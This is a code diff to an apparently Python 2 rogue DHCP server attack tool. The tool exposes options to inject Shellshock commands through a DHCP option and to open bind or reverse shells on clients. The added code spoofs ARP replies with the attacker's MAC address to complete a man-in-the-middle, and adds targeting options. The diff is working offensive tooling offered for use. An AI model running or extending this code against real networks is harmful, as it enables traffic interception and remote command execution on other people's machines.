@@ -5,7 +5,7 @@ from network import Ethernet_raw, DHCP_raw
 from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv4Address
-from scapy.all import BOOTP, DHCP, sniff
+from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
 from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
@@ -17,9 +17,10 @@ Base.check_platform()
 parser = ArgumentParser(description='DHCP Rogue server')
 
 parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
-parser.add_argument('-f', '--first_offer_ip', type=str, required=True, help='Set first client ip for offering')
-parser.add_argument('-l', '--last_offer_ip', type=str, required=True, help='Set last client ip for offering')
+parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default='192.168.0.2')
+parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default='192.168.0.253')
 parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
+parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
@@ -30,12 +31,18 @@ parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use
 parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
 parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
 parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')
+
 parser.add_argument('-O', '--shellshock_option_code', type=int,
                     help='Set dhcp option code for inject shellshock payload, default=114', default=114)
 
-parser.add_argument('--ip_path', type=str, help='Set path to "ip" in shellshock payload, default = /bin/', default="/bin/")
-parser.add_argument('--iface_name', type=str, help='Set iface name in shellshock payload, default = eth0', default="eth0")
+parser.add_argument('--ip_path', type=str,
+                    help='Set path to "ip" in shellshock payload, default = /bin/', default="/bin/")
 
+parser.add_argument('--iface_name', type=str,
+                    help='Set iface name in shellshock payload, default = eth0', default="eth0")
+
+parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address')
+parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your IP address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
 parser.add_argument('--netmask', type=str, help='Set network mask, if not set use your netmask')
 parser.add_argument('--broadcast', type=str, help='Set network broadcast, if not set use your broadcast')
@@ -51,6 +58,7 @@ dhcp = DHCP_raw()
 
 current_network_interface = None
 target_mac_address = None
+target_ip_address = None
 offer_ip_address = None
 dhcp_server_mac_address = None
 dhcp_server_ip_address = None
@@ -68,6 +76,11 @@ if args.interface is None:
     current_network_interface = Base.netiface_selection()
 else:
     current_network_interface = args.interface
+
+args.target_mac = str(args.target_mac).lower()
+
+if args.target_ip is not None:
+    target_ip_address = args.target_ip
 
 your_mac_address = Base.get_netiface_mac_address(current_network_interface)
 if your_mac_address is None:
@@ -182,21 +195,24 @@ def make_dhcp_nak_packet(transaction_id, requested_ip):
 
 
 def dhcp_reply(request):
+    global offer_ip_address
+    global target_mac_address
+    global target_ip_address
+    global number_of_dhcp_request
+    global shellshock_url
+    global domain
+    global your_mac_address
+
+    SOCK = socket(AF_PACKET, SOCK_RAW)
+    SOCK.bind((current_network_interface, 0))
+
     if request.haslayer(DHCP):
-        global offer_ip_address
-        global target_mac_address
-        global number_of_dhcp_request
-        global shellshock_url
-        global domain
 
         domain = bytes(args.domain)
         offer_ip_address = args.first_offer_ip
 
         transaction_id = request[BOOTP].xid
         target_mac_address = ":".join("{:02x}".format(ord(c)) for c in request[BOOTP].chaddr[0:6])
-
-        SOCK = socket(AF_PACKET, SOCK_RAW)
-        SOCK.bind((current_network_interface, 0))
 
         if request[DHCP].options[0][1] == 1:
             next_offer_ip_address = IPv4Address(unicode(args.first_offer_ip)) + number_of_dhcp_request
@@ -323,19 +339,45 @@ def dhcp_reply(request):
                 SOCK.send(ack_packet)
                 print "[INFO] Send ack response!"
 
-        SOCK.close()
+    if request.haslayer(ARP):
+        if target_ip_address is not None:
+            if request[ARP].op == 1:
+                if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
+                    print "Gratuitous ARP MAC: " + request[ARP].hwsrc + " IP: " + request[ARP].pdst
+                    if request[ARP].pdst != target_ip_address:
+                        arp_reply = Ether(dst=request[ARP].hwsrc, src=your_mac_address) \
+                                    / ARP(hwsrc=your_mac_address, psrc=request[ARP].pdst,
+                                          hwdst=request[ARP].hwsrc, pdst=request[ARP].psrc, op=2)
+                        SOCK.send(arp_reply)
+                        print "[INFO] Send ARP response!"
+                    else:
+                        print "[INFO] MiTM success!"
+                        SOCK.close()
+                        exit(0)
+
+    SOCK.close()
 
 
 if __name__ == "__main__":
-    if args.target_mac is None:
-        print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
-        sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
-                                d.src != Base.get_netiface_mac_address(current_network_interface),
-              filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
-              prn=dhcp_reply, iface=current_network_interface)
+    if args.target_ip is not None:
+        if args.target_mac is None:
+            print "Please set target MAC address ( --target_mac 00:AA:BB:CC:DD:FF)"
+            exit(1)
+        else:
+            print "Waiting for ARP, DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
+            sniff(lfilter=lambda d: d.src == args.target_mac,
+                  filter="arp or (udp and src port 68 and dst port 67)",
+                  prn=dhcp_reply, iface=current_network_interface)
     else:
-        print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
-        sniff(lfilter=lambda d: d.src == args.target_mac,
-              filter="udp and src port 68 and dst port 67",
-              prn=dhcp_reply, iface=current_network_interface)
+        if args.target_mac is None:
+            print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM ..."
+            sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
+                                    d.src != Base.get_netiface_mac_address(current_network_interface),
+                  filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
+                  prn=dhcp_reply, iface=current_network_interface)
+        else:
+            print "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac + " ..."
+            sniff(lfilter=lambda d: d.src == args.target_mac,
+                  filter="udp and src port 68 and dst port 67",
+                  prn=dhcp_reply, iface=current_network_interface)
 
